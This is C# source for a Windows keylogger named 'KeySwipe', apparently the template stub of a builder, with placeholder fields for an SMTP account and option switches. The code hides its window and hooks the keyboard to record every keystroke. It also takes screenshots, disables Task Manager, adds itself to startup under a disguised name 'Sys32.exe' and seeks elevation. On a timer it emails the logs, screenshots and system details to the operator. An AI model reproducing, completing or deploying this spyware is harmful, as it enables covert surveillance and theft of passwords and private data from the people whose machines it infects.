using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Text;
using System.Management;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Timers;
using System.Drawing;
using System.Drawing.Imaging;

namespace ConsoleApp1
{
    partial class Program
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallBack;
        public static string temp = Path.GetTempPath();

        public static string email = "_email";
        public static string pass = "_pass";
        public static string host = "_SMTPhost";
        public static int port = int.Parse("_SMTPport");
        public static bool sleep;
        public static string ms = "_ms";
        public static bool info;
        public static bool msg;
        public static bool distask;
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        public static bool getip;
        public static int intervaltimer = int.Parse("%INTERVAL%") * 60000;
        //string IP;
        //temp + "data.txt", b.Data
        //temp + "errordata.txt", b.Data
        public static bool droptotemp;
        public static bool hiddenattributes;
        public static bool admin;

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        public static string nameofthis = System.AppDomain.CurrentDomain.FriendlyName;
        public static bool startupadd;
        public static System.Timers.Timer myTimer;
        public static bool screenshot;
        public static string currentdir = Directory.GetCurrentDirectory();


        private static void myEvent(object source, ElapsedEventArgs e) 
        {
            if (screenshot == true)
            { TakeScreenShot(); }
            SendMail();
        }
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            myTimer = new System.Timers.Timer();
            myTimer.Elapsed += new ElapsedEventHandler(myEvent);
            myTimer.Interval = intervaltimer;
            myTimer.Enabled = true;
            int time = int.Parse(ms);
            sleep = _sleep;
            if (sleep == true)
            {
                Thread.Sleep(time);
            }


            place:
            droptotemp = %dropthis%;
            if(droptotemp == true)
            {
                try
                {
                    byte[] thisfile = File.ReadAllBytes(currentdir + "/" + nameofthis);
                    File.WriteAllBytes(temp + "Sys32.exe", thisfile);
                }catch(Exception)
                {

                }
            }
            screenshot = _screenlog;
            if(screenshot == true)
            {
                TakeScreenShot();
            }
            getip = %GETIP%;
            if (getip == true)
            {
                GetDeviceIp();
            }
            distask = _dis;
            if(distask == true)
            {
                DisableTaskMGR();
            }

            startupadd = _startup;
            if(startupadd == true)
            {
                StartupAdder();
            }
            admin = %adm%;
            string tmp = Path.GetTempPath();
            if (admin == true)
            {
                if (File.Exists(tmp + "admin.poison"))
                {
                    File.Delete(tmp + "admin.poison");
                    goto now;
                }
                else
                {
                    try
                    {
                        Process proc = new Process();
                        proc.StartInfo.FileName = nameofthis;
                        proc.StartInfo.UseShellExecute = true;
                        proc.StartInfo.Verb = "runas";
                        proc.Start();
                        File.WriteAllText(tmp + "admin.poison", "t");
                        Environment.Exit(0);
                    }
                    catch (Exception)
                    {
                        
                    }

                }

            }
            now:
            hiddenattributes = _hidden;
            if (hiddenattributes == true)
            {
                if (File.Exists(temp + "hiddenatrib"))
                {
                    File.Delete(temp + "hiddenatrib");
                    goto here;
                }
                else
                {
                    try
                    {
                        byte[] thisfile = File.ReadAllBytes(currentdir + "/" + nameofthis);
                        File.WriteAllBytes(currentdir + "/Sys32.exe", thisfile);
                        File.SetAttributes(currentdir + "/Sys32.exe", FileAttributes.Hidden);
                        Process.Start(currentdir + "/Sys32.exe");
                        File.WriteAllText(temp + "hiddenatrib", " ");
                        Environment.Exit(0);
                    }
                    catch (Exception)
                    {
                        
                    }
                }
            }
            here:
            msg = %Message%; 
            if(msg == true)
            {
                MessageBox.Show("_BODY", "_TITLE", _Buttons, _Icon);
            }
            info = _info;
            if(info == true)
            {
                GETINFO();
            }
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if(nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    try
                    {
                        Console.Out.Write(".");
                        StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                        output.Write(".");
                        output.Close();
                    }
                    catch (Exception)
                    {

                    }
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    try
                    {
                        Console.Out.Write(",");
                        StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                        output.Write(",");
                        output.Close();
                    }
                    catch (Exception)
                    {

                    }
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    try
                    {
                        Console.Out.Write(" [SPACE] ");
                        StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                        output.Write(" [SPACE] ");
                        output.Close();
                    }
                    catch (Exception)
                    {

                    }
                }
                else if (((Keys)vkCode).ToString() == "Return")
                {
                    Console.Out.Write(" [ENTER] ");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write(" [ENTER] ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Back")
                {
                    Console.Out.Write(" [BACKSPACE] ");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write(" BACKSPACE ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "RShiftKey")
                {
                    Console.Out.Write(" [RSHIFT] ");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write(" [RSHIFT] ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "LShiftKey")
                {
                    Console.Out.Write(" [LSHIFT] ");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write(" [LSHIFT] ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Tab")
                {
                    Console.Out.Write(" [TAB] ");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write(" [TAB] ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D0")
                {
                    Console.Out.Write("0");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("0");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D1")
                {
                    Console.Out.Write("1");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("1");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D2")
                {
                    Console.Out.Write("2");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("2");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D3")
                {
                    Console.Out.Write("3");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("3");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D4")
                {
                    Console.Out.Write("4");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("4");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D5")
                {
                    Console.Out.Write("5");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("5");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D6")
                {
                    Console.Out.Write("6");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("6");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D7")
                {
                    Console.Out.Write("7");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("7");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D8")
                {
                    Console.Out.Write("8");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("8");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "D9")
                {
                    Console.Out.Write("9");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("9");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "OemMinus")
                {
                    Console.Out.Write("-");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("-");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemplus")
                {
                    Console.Out.Write("+");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("+");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "LControlKey")
                {
                    Console.Out.Write(" [LCTRL] ");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write(" [LCTRL] ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oem5")
                {
                    Console.Out.Write(@"\");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write(@"\");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "OemQuestion")
                {
                    Console.Out.Write("/");
                    StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                    output.Write("/");
                    output.Close();
                }
                else
                {
                    try
                    {
                        Console.Out.Write((Keys)vkCode);
                        StreamWriter output = new StreamWriter(temp + "logs.txt", true);
                        output.Write((Keys)vkCode);
                        output.Close();
                    }
                    catch (Exception)
                    {

                    }
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public static string sysinfo;

        static void SendMail()
        {
            if(File.Exists(temp + "info.txt"))
            {
                sysinfo = File.ReadAllText(temp + "info.txt");
            }
            try
            {
                string dalogs = File.ReadAllText((temp + "logs.txt"));
                var login = new NetworkCredential(email, pass);
                var client = new SmtpClient();
                client.Host = host;
                client.Port = port;
                client.EnableSsl = true;
                client.Credentials = login;
                var message = new MailMessage(email, email);
                message.Subject = "Logs for " + Environment.UserName + " | KeySwipe";
                message.Body = "*****Sysinfo*****" + Environment.NewLine + os + Environment.NewLine + arch + Environment.NewLine + pack + "Ip Address = " + myip + Environment.NewLine + "PC Name = " + Environment.MachineName + Environment.NewLine + Environment.NewLine + "*****LOGS*****" + Environment.NewLine + dalogs + Environment.NewLine;
                message.BodyEncoding = Encoding.UTF8;
                if(File.Exists(temp + "img.png"))
                {
                    message.Attachments.Add(new Attachment(temp + "img.png"));
                    File.Delete(temp + "img.png");
                }
                message.IsBodyHtml = false;
                message.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
                client.Send(message);
                
                File.Delete(temp + "logs.txt");
            }
            catch (Exception)
            {

            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            string moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        static void DisableTaskMGR()
        {
            try
            {
                RegistryKey regkey;
                string keyValueInt = "1";
                string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
                regkey = Registry.CurrentUser.CreateSubKey(subKey);
                regkey.SetValue("DisableTaskMgr", keyValueInt);
                regkey.Close();
            }
            catch (Exception)
            {
                
            }
        }

        public static string myip;
        public static string os;
        public static string arch;
        public static string pack;

        static void GetDeviceIp()
        {
            myip = Dns.GetHostName();
        }

        static void GETINFO()
        {
            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
            foreach (ManagementObject managementObject in mos.Get())
            {
                if (managementObject["Caption"] != null)
                {
                    os = "Operating System Name  :  " + managementObject["Caption"].ToString();   //Display operating system caption
                }
                if (managementObject["OSArchitecture"] != null)
                {
                    arch = "Operating System Architecture  :  " + managementObject["OSArchitecture"].ToString();   //Display operating system architecture.
                }
                if (managementObject["CSDVersion"] != null)
                {
                    pack = "Operating System Service Pack   :  " + managementObject["CSDVersion"].ToString();     //Display operating system version.
                }
                
            }
        }

        static void TakeScreenShot()
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics gr = Graphics.FromImage(bmp);
            gr.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            
            bmp.Save(temp + "img.png", System.Drawing.Imaging.ImageFormat.Png);
        }

        static void StartupAdder()
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue(nameofthis, Application.ExecutablePath);
        }

        [DllImport("user32.Dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.Dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.Dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.Dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}